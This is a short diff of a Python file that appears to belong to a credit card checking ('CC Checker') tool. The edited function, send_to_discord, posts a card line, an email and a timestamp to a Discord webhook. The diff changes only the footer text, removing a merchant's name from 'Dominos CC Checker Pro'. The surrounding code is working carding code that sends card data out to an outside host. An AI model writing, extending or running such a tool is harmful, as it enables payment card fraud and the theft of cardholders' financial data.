@@ -41,7 +41,7 @@ def send_to_discord(card_line, user_email):
                     {"name": "Card", "value": f"`{card_line}`", "inline": False},
                     {"name": "Data", "value": f"`{timestamp}`", "inline": True}
                 ],
-                "footer": {"text": "Dominos CC Checker Pro"}
+                "footer": {"text": "CC Checker Pro"}
             }]
         }
         requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
